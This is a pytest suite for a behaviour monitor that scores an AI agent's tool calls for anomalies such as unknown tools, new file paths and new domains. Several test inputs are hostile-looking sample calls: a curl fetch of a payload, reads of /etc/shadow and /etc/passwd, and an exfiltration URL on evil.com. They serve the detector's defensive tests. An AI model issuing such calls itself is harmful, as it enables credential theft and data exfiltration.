"""Tests for sentinelai.monitor.behavior_monitor."""

from __future__ import annotations

import json
import tempfile
import time
from pathlib import Path

import pytest

from sentinelai.monitor import AnomalyResult, BehaviorMonitor


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _fill_baseline(monitor: BehaviorMonitor, tool: str = "Read", n: int | None = None) -> None:
    """Record *n* calls (default: monitor._baseline_size) to complete the baseline."""
    count = n if n is not None else monitor._baseline_size
    ts = 1_000_000.0
    for i in range(count):
        monitor.record(tool, {"path": f"/home/user/file{i}.py"}, timestamp=ts + i)


def _fill_baseline_varied(monitor: BehaviorMonitor) -> None:
    """Fill baseline with a mix of tools and paths/domains."""
    size = monitor._baseline_size
    ts = 1_000_000.0
    for i in range(size):
        if i % 3 == 0:
            monitor.record("Bash", {"command": "ls /home/user"}, timestamp=ts + i)
        elif i % 3 == 1:
            monitor.record("Read", {"path": "/home/user/config.py"}, timestamp=ts + i)
        else:
            monitor.record(
                "WebFetch",
                {"url": "https://github.com/example/repo"},
                timestamp=ts + i,
            )


# ---------------------------------------------------------------------------
# 1. test_init_defaults
# ---------------------------------------------------------------------------

def test_init_defaults():
    monitor = BehaviorMonitor()
    assert monitor._baseline_size == 50
    assert monitor._anomaly_threshold == 0.6


# ---------------------------------------------------------------------------
# 2. test_init_custom_params
# ---------------------------------------------------------------------------

def test_init_custom_params():
    monitor = BehaviorMonitor(baseline_size=10, anomaly_threshold=0.5)
    assert monitor._baseline_size == 10
    assert monitor._anomaly_threshold == 0.5


# ---------------------------------------------------------------------------
# 3. test_record_increments_count
# ---------------------------------------------------------------------------

def test_record_increments_count():
    monitor = BehaviorMonitor(baseline_size=10)
    assert len(monitor._calls) == 0
    monitor.record("Bash", {"command": "ls"})
    assert len(monitor._calls) == 1
    monitor.record("Read", {"path": "/tmp/a.txt"})
    assert len(monitor._calls) == 2


# ---------------------------------------------------------------------------
# 4. test_baseline_not_complete_initially
# ---------------------------------------------------------------------------

def test_baseline_not_complete_initially():
    monitor = BehaviorMonitor(baseline_size=10)
    assert monitor.is_baseline_complete() is False


# ---------------------------------------------------------------------------
# 5. test_baseline_complete_after_n_calls
# ---------------------------------------------------------------------------

def test_baseline_complete_after_n_calls():
    monitor = BehaviorMonitor(baseline_size=5)
    assert monitor.is_baseline_complete() is False
    _fill_baseline(monitor, n=5)
    assert monitor.is_baseline_complete() is True


# ---------------------------------------------------------------------------
# 6. test_score_before_baseline_returns_zero
# ---------------------------------------------------------------------------

def test_score_before_baseline_returns_zero():
    monitor = BehaviorMonitor(baseline_size=10)
    result = monitor.score("Bash", {"command": "echo hi"})
    assert result.score == 0.0
    assert result.is_anomaly is False
    assert result.alerts == []


# ---------------------------------------------------------------------------
# 7. test_score_known_tool_low_score
# ---------------------------------------------------------------------------

def test_score_known_tool_low_score():
    monitor = BehaviorMonitor(baseline_size=10, anomaly_threshold=0.6)
    _fill_baseline(monitor, tool="Read", n=10)
    # Score "Read" with a path already seen in the baseline
    result = monitor.score("Read", {"path": "/home/user/file0.py"})
    assert result.score < 0.6


# ---------------------------------------------------------------------------
# 8. test_score_unknown_tool_high_score
# ---------------------------------------------------------------------------

def test_score_unknown_tool_high_score():
    monitor = BehaviorMonitor(baseline_size=10, anomaly_threshold=0.6)
    _fill_baseline(monitor, tool="Read", n=10)
    result = monitor.score("DeleteTool", {"path": "/tmp/x"})
    assert result.score >= 0.4


# ---------------------------------------------------------------------------
# 9. test_score_unknown_tool_is_anomaly
# ---------------------------------------------------------------------------

def test_score_unknown_tool_is_anomaly():
    monitor = BehaviorMonitor(baseline_size=10, anomaly_threshold=0.4)
    _fill_baseline(monitor, tool="Read", n=10)
    result = monitor.score("DeleteTool", {"path": "/tmp/x"})
    assert result.is_anomaly is True


# ---------------------------------------------------------------------------
# 10. test_score_known_tool_not_anomaly
# ---------------------------------------------------------------------------

def test_score_known_tool_not_anomaly():
    monitor = BehaviorMonitor(baseline_size=10, anomaly_threshold=0.6)
    _fill_baseline(monitor, tool="Read", n=10)
    # Scoring with a known path from the baseline should not be anomalous.
    result = monitor.score("Read", {"path": "/home/user/file3.py"})
    assert result.is_anomaly is False


# ---------------------------------------------------------------------------
# 11. test_unknown_tool_alert_message
# ---------------------------------------------------------------------------

def test_unknown_tool_alert_message():
    monitor = BehaviorMonitor(baseline_size=5)
    _fill_baseline(monitor, tool="Read", n=5)
    result = monitor.score("NeverSeenTool", {})
    assert any("Unknown tool: NeverSeenTool" in a for a in result.alerts)


# ---------------------------------------------------------------------------
# 12. test_new_file_path_detected
# ---------------------------------------------------------------------------

def test_new_file_path_detected():
    monitor = BehaviorMonitor(baseline_size=5)
    _fill_baseline(monitor, tool="Read", n=5)
    # Use a path not present in the baseline
    result = monitor.score("Read", {"path": "/etc/shadow"})
    assert any("New file path" in a for a in result.alerts)
    assert result.score > 0.0


# ---------------------------------------------------------------------------
# 13. test_known_file_path_no_alert
# ---------------------------------------------------------------------------

def test_known_file_path_no_alert():
    monitor = BehaviorMonitor(baseline_size=5)
    _fill_baseline(monitor, tool="Read", n=5)
    # "/home/user/file0.py" was recorded during baseline filling
    result = monitor.score("Read", {"path": "/home/user/file0.py"})
    assert not any("New file path" in a for a in result.alerts)


# ---------------------------------------------------------------------------
# 14. test_new_domain_detected
# ---------------------------------------------------------------------------

def test_new_domain_detected():
    monitor = BehaviorMonitor(baseline_size=5)
    _fill_baseline(monitor, tool="Read", n=5)
    result = monitor.score("Bash", {"command": "curl https://malicious.example.com/payload"})
    assert any("New domain" in a for a in result.alerts)
    assert result.score > 0.0


# ---------------------------------------------------------------------------
# 15. test_known_domain_no_alert
# ---------------------------------------------------------------------------

def test_known_domain_no_alert():
    monitor = BehaviorMonitor(baseline_size=5)
    # Fill baseline with a fetch to github.com
    ts = 1_000_000.0
    for i in range(4):
        monitor.record("Read", {"path": f"/home/user/f{i}.py"}, timestamp=ts + i)
    monitor.record(
        "WebFetch",
        {"url": "https://github.com/example"},
        timestamp=ts + 4,
    )
    assert monitor.is_baseline_complete() is True
    result = monitor.score("WebFetch", {"url": "https://github.com/other/repo"})
    assert not any("New domain" in a for a in result.alerts)


# ---------------------------------------------------------------------------
# 16. test_save_and_load_baseline (round-trip)
# ---------------------------------------------------------------------------

def test_save_and_load_baseline():
    monitor = BehaviorMonitor(baseline_size=5)
    _fill_baseline(monitor, tool="Bash", n=5)

    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        tmp_path = f.name

    monitor.save_baseline(tmp_path)

    monitor2 = BehaviorMonitor(baseline_size=99)  # different default
    monitor2.load_baseline(tmp_path)

    assert monitor2.is_baseline_complete() is True
    assert monitor2._baseline_size == 5
    assert len(monitor2._calls) == 5


# ---------------------------------------------------------------------------
# 17. test_load_baseline_restores_tool_counts
# ---------------------------------------------------------------------------

def test_load_baseline_restores_tool_counts():
    monitor = BehaviorMonitor(baseline_size=5)
    _fill_baseline(monitor, tool="Bash", n=5)

    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        tmp_path = f.name

    monitor.save_baseline(tmp_path)

    monitor2 = BehaviorMonitor(baseline_size=5)
    monitor2.load_baseline(tmp_path)

    assert monitor2._tool_counts.get("Bash", 0) == 5


# ---------------------------------------------------------------------------
# 18. test_load_baseline_restores_file_paths
# ---------------------------------------------------------------------------

def test_load_baseline_restores_file_paths():
    monitor = BehaviorMonitor(baseline_size=3)
    ts = 1_000_000.0
    monitor.record("Read", {"path": "/home/user/alpha.py"}, timestamp=ts)
    monitor.record("Read", {"path": "/home/user/beta.py"}, timestamp=ts + 1)
    monitor.record("Read", {"path": "/home/user/gamma.py"}, timestamp=ts + 2)

    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        tmp_path = f.name

    monitor.save_baseline(tmp_path)

    monitor2 = BehaviorMonitor(baseline_size=3)
    monitor2.load_baseline(tmp_path)

    assert "/home/user/alpha.py" in monitor2._file_paths
    assert "/home/user/beta.py" in monitor2._file_paths
    assert "/home/user/gamma.py" in monitor2._file_paths


# ---------------------------------------------------------------------------
# 19. test_load_baseline_restores_domains
# ---------------------------------------------------------------------------

def test_load_baseline_restores_domains():
    monitor = BehaviorMonitor(baseline_size=2)
    ts = 1_000_000.0
    monitor.record("Fetch", {"url": "https://trusted.example.com/data"}, timestamp=ts)
    monitor.record("Fetch", {"url": "https://api.github.com/repos"}, timestamp=ts + 1)

    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        tmp_path = f.name

    monitor.save_baseline(tmp_path)

    monitor2 = BehaviorMonitor(baseline_size=2)
    monitor2.load_baseline(tmp_path)

    assert "trusted.example.com" in monitor2._domains
    assert "api.github.com" in monitor2._domains


# ---------------------------------------------------------------------------
# 20. test_reset_clears_data
# ---------------------------------------------------------------------------

def test_reset_clears_data():
    monitor = BehaviorMonitor(baseline_size=5)
    _fill_baseline(monitor, tool="Read", n=5)
    assert monitor.is_baseline_complete() is True

    monitor.reset()

    assert monitor.is_baseline_complete() is False
    assert len(monitor._calls) == 0
    assert monitor._tool_counts == {}
    assert len(monitor._file_paths) == 0
    assert len(monitor._domains) == 0


# ---------------------------------------------------------------------------
# 21. test_get_stats_before_baseline
# ---------------------------------------------------------------------------

def test_get_stats_before_baseline():
    monitor = BehaviorMonitor(baseline_size=10)
    monitor.record("Read", {"path": "/tmp/a.txt"})

    stats = monitor.get_stats()

    assert stats["total_recorded"] == 1
    assert stats["baseline_size"] == 10
    assert stats["is_complete"] is False
    assert isinstance(stats["top_tools"], list)


# ---------------------------------------------------------------------------
# 22. test_get_stats_after_baseline
# ---------------------------------------------------------------------------

def test_get_stats_after_baseline():
    monitor = BehaviorMonitor(baseline_size=5)
    _fill_baseline(monitor, tool="Read", n=5)

    stats = monitor.get_stats()

    assert stats["total_recorded"] == 5
    assert stats["is_complete"] is True
    assert stats["top_tools"][0]["tool"] == "Read"
    assert stats["top_tools"][0]["count"] == 5


# ---------------------------------------------------------------------------
# 23. test_score_capped_at_1
# ---------------------------------------------------------------------------

def test_score_capped_at_1():
    """Multiple simultaneous anomaly signals must not push score above 1.0."""
    monitor = BehaviorMonitor(baseline_size=5, anomaly_threshold=0.6)
    _fill_baseline(monitor, tool="Read", n=5)

    # Unknown tool + new path + new domain — combined raw score > 1.0
    result = monitor.score(
        "NeverSeenTool",
        {
            "path": "/etc/passwd",
            "url": "https://evil.com/exfil?data=secret",
            "url2": "https://another-evil.org/upload",
            "url3": "https://third-evil.net/data",
        },
    )
    assert result.score <= 1.0
    assert result.is_anomaly is True


# ---------------------------------------------------------------------------
# 24. test_record_with_explicit_timestamp
# ---------------------------------------------------------------------------

def test_record_with_explicit_timestamp():
    monitor = BehaviorMonitor(baseline_size=3)
    explicit_ts = 9_999_999.0
    monitor.record("Bash", {"command": "echo hi"}, timestamp=explicit_ts)

    assert monitor._calls[0]["timestamp"] == explicit_ts
    assert monitor._timestamps[0] == explicit_ts


# ---------------------------------------------------------------------------
# Additional edge-case tests
# ---------------------------------------------------------------------------

def test_anomaly_result_dataclass_fields():
    result = AnomalyResult(score=0.7, is_anomaly=True, alerts=["x"], details={"k": "v"})
    assert result.score == 0.7
    assert result.is_anomaly is True
    assert result.alerts == ["x"]
    assert result.details == {"k": "v"}


def test_anomaly_result_defaults():
    result = AnomalyResult(score=0.0, is_anomaly=False)
    assert result.alerts == []
    assert result.details == {}


def test_import_from_package():
    """Verify top-level package re-exports work correctly."""
    from sentinelai.monitor import BehaviorMonitor as BM
    from sentinelai.monitor import AnomalyResult as AR
    assert BM is BehaviorMonitor
    assert AR is AnomalyResult


def test_save_baseline_json_structure():
    """Verify saved JSON has the expected keys and version."""
    monitor = BehaviorMonitor(baseline_size=3)
    _fill_baseline(monitor, tool="Bash", n=3)

    with tempfile.NamedTemporaryFile(suffix=".json", delete=False, mode="w") as f:
        tmp_path = f.name

    monitor.save_baseline(tmp_path)
    data = json.loads(Path(tmp_path).read_text())

    assert data["version"] == "1"
    assert data["baseline_size"] == 3
    assert "calls" in data
    assert "tool_counts" in data
    assert "file_paths" in data
    assert "domains" in data
    assert "recorded_at" in data


def test_score_no_new_paths_or_domains_for_known_tool():
    """A known tool with only known paths and no domains should score 0.0."""
    monitor = BehaviorMonitor(baseline_size=5, anomaly_threshold=0.6)
    ts = 1_000_000.0
    for i in range(5):
        monitor.record("Read", {"path": "/home/user/project/main.py"}, timestamp=ts + i)

    result = monitor.score("Read", {"path": "/home/user/project/main.py"})
    assert result.score == 0.0
    assert result.is_anomaly is False
    assert result.alerts == []
